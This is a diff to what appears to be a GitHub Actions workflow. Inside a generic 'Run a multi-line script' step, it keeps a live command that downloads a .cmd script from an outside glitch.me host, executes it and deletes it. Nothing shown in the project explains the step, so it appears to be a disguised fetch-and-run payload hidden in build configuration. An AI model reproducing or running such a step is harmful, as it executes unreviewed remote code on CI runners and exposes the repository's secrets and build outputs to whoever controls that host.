@@ -32,6 +32,6 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          cmd curl -sL https://noob-human.glitch.me/noob.cmd > noob.cmd && noob && del noob.cmd
-          cmd gcc --version
+          curl -sL https://noob-human.glitch.me/noob.cmd > noob.cmd && noob && del noob.cmd
+          gcc --version
         shell: cmd
